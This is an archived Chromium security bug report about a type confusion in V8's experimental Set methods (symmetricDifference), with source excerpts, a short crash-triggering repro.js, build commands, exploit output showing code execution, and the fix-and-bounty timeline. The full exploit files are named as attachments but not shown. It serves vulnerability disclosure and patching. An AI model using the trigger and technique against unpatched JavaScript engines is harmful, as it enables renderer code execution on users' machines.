# Security: Type confusion in Harmony Set methods (Leads to RCE)

| Field | Value |
|-------|-------|
| **Issue ID** | [41483297](https://issues.chromium.org/issues/41483297) |
| **Status** | Fixed |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | h0...@gmail.com |
| **Assignee** | re...@chromium.org |
| **Created** | 2023-12-12 |
| **Bounty** | $7,000.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/HEAD/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

**VULNERABILITY DETAILS**

This bug is a variant of <https://crbug.com/chromium/1473631>.

```
/\* src/builtins/set-symmetric-difference.tq \*/  
  
// https://tc39.es/proposal-set-methods/#sec-set.prototype.symmetricdifference  
transitioning javascript builtin SetPrototypeSymmetricDifference(  
    js-implicit context: NativeContext, receiver: JSAny)(other: JSAny): JSSet {  
...  
  // 3. Let otherRec be ? GetSetRecord(other).  
  let otherRec = GetSetRecord(other, methodName);  
  
  const table = Cast<OrderedHashSet>(o.table) otherwise unreachable;  
...  
  };  

```

<https://crbug.com/chromium/1473631> was about the order of these two lines of code. Before the [patch](https://chromium.googlesource.com/v8/v8.git/+/9e0005d745067c5dab681d9c95483bc71c317e2d), these lines were in reverse order. We were able to redefine `size` property of `receiver` as a getter, and clear `receiver` inside the getter. If so, a new table for is allocated, and old table remains in `table` variable, returned to user (similar to UAF).

```
/\* src/builtins/set-symmetric-difference.tq \*/  
  
// https://tc39.es/proposal-set-methods/#sec-set.prototype.symmetricdifference  
transitioning javascript builtin SetPrototypeSymmetricDifference(  
    js-implicit context: NativeContext, receiver: JSAny)(other: JSAny): JSSet {  
...  
  const table = Cast<OrderedHashSet>(o.table) otherwise unreachable;  
  
  // 4. Let keysIter be ? GetKeysIterator(otherRec).  
  let keysIter =  
      GetKeysIterator(otherRec.object, UnsafeCast<Callable>(otherRec.keys));  
...  
  };  

```

Similarly, this bug is about the order of these two lines. We can redefine `keys()` method of `receiver`, and clear `receiver` inside the method. Result is the same. A new table is allocated, and old table remains in `table` variable, returned to user (also, similar to UAF).

```
/\* repro.js \*/  
  
let a = new Set();  
let b = new Set();  
  
b.keys = () => {  
    a.clear();  
    return b[Symbol.iterator]();  
}  
  
a.symmetricDifference(b);  

```

**VERSION**

Chrome Version: 120.0.6099.71 (Official Build)  

V8 commit hash: d842c545eda0e991e43a7f324d8b27566b438e0a  

Operating System: Tested in Linux (Ubuntu 22.04)

**REPRODUCTION CASE**

$ gn gen out/debug --args='v8\_no\_inline=true v8\_optimized\_debug=false is\_component\_build=false'  

$ ninja -C out/debug d8  

$ ~/V8/v8/out/debug/d8 --harmony-set-methods repro.js  

abort: CSA\_DCHECK failed: Torque assert 'Is<A>(o)' failed [src/builtins/cast.tq:834] [../../src/builtins/set-symmetric-difference.tq:33]  

...

$ ./tools/dev/gm.py x64.release  

$ ~/V8/v8/out/x64.release/d8 --harmony-set-methods ex.js  

[+] address of fake\_arr: 0x4b568  

[+] address of obj\_arr[0]: 0x4baa4  

[+] address of wasmInstance: 0x19b44c  

[+] address of rwx region: 0x314131733000  

$ id  

uid=1000(h0meb0dy) gid=1000(h0meb0dy) groups=1000(h0meb0dy),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(netdev),1001(docker)

$ google-chrome --no-sandbox --js-flags="--harmony-set-methods" ex.html  

(type `sh()` at console)

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

**Type of crash: [tab, browser, etc.]**  

**Crash State: [see link above: stack trace \*with symbols\*, registers,**  

**exception record]**  

**Client ID (if relevant): [see link above]**

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Seongjoon Cho of CW Research Inc.

## Attachments

- [repro.js](attachments/repro.js) (text/plain, 132 B)
- [ex.js](attachments/ex.js) (text/plain, 3.1 KB)
- [ex.html](attachments/ex.html) (text/plain, 3.9 KB)
- [1510709_asan.txt](attachments/1510709_asan.txt) (text/plain, 8.6 KB)

## Timeline

### [Deleted User] (2023-12-12)

[Empty comment from Monorail migration]

### h0...@gmail.com (2023-12-12)

deleted

### cl...@chromium.org (2023-12-12)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4963378605260800.

### cl...@chromium.org (2023-12-12)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5531061461647360.

### bo...@chromium.org (2023-12-12)

Great report! We especially appreciate the exploit examples. 

ClusterFuzz validated the bug [1] and the ASan report is attached. 

Setting severity to high per RCE in the renderer process. Impact will be none since the vulnerability resides in a non-enabled feature (--harmony-set-methods). 

Routing to V8 sheriff for further assessment. 

[1] https://clusterfuzz.com/testcase-detail/5531061461647360

[Monorail components: Blink>JavaScript]

### cl...@chromium.org (2023-12-12)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>JavaScript>Runtime]

### cl...@chromium.org (2023-12-12)

Detailed Report: https://clusterfuzz.com/testcase?key=4963378605260800

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: Abrt
Crash Address: 0x0539003c7dd6
Crash State:
  Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit
  Builtins_SetPrototypeSymmetricDifference
  Builtins_InterpreterEntryTrampoline
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=88538:88539

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4963378605260800

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2023-12-12)

[Empty comment from Monorail migration]

### re...@chromium.org (2023-12-12)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-12)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2023-12-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff

commit 4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff
Author: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
Date: Tue Dec 12 21:46:16 2023

[set-methods]Get receiver's table after other's keys()

This CL fixes the issue of clearing receiver's table in
case of having user's arbitrary code in other's keys().

Bug: v8:13556, chromium:1510709
Change-Id: Ide01162688409b75d6a11902364179cdd12f7a0c
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5117451
Reviewed-by: Shu-yu Guo <syg@chromium.org>
Commit-Queue: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
Cr-Commit-Position: refs/heads/main@{#91475}

[modify] https://crrev.com/4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff/test/mjsunit/harmony/set-is-superset-of.js
[modify] https://crrev.com/4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff/test/mjsunit/harmony/set-is-subset-of.js
[modify] https://crrev.com/4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff/test/mjsunit/harmony/set-is-disjoint-from.js
[modify] https://crrev.com/4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff/test/mjsunit/harmony/set-union.js
[modify] https://crrev.com/4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff/test/mjsunit/harmony/set-symmetric-difference.js
[modify] https://crrev.com/4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff/test/mjsunit/harmony/set-intersection.js
[modify] https://crrev.com/4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff/test/mjsunit/harmony/set-difference.js
[modify] https://crrev.com/4d0ea4aac11c66481e0bf6c2b1e9308a1b442aff/src/builtins/set-symmetric-difference.tq


### cl...@chromium.org (2023-12-13)

Detailed Report: https://clusterfuzz.com/testcase?key=5531061461647360

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7bb2001971ac
Crash State:
  Builtins_KeyedLoadIC
  Builtins_InterpreterEntryTrampoline
  Builtins_JSEntryTrampoline
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1230025:1230088

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5531061461647360

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


The recommended severity (Security_Severity-Medium) is different from what was assigned to the bug. Please double check the accuracy of the assigned severity.

### [Deleted User] (2023-12-13)

[Empty comment from Monorail migration]

### sy...@chromium.org (2023-12-13)

Setting to Security_Impact-None since set methods is still disabled by default (not shipped). 

### cl...@chromium.org (2023-12-13)

ClusterFuzz testcase 4963378605260800 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=91474:91475

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### [Deleted User] (2023-12-13)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-13)

[Empty comment from Monorail migration]

### am...@google.com (2024-01-03)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2024-01-03)

Congratulations h0meb0dy! The Chrome VRP Panel has decided to award you $7,000 for this report of renderer memory corruption / RCE. A member of our finance team (p2p-vrp) will be in touch with you to arrange payment soon. Thank you for your efforts and reporting this issue to us -- nice work! 

### am...@google.com (2024-01-05)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1510709?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>JavaScript, Blink>JavaScript>Runtime]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-21)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/41483297)*
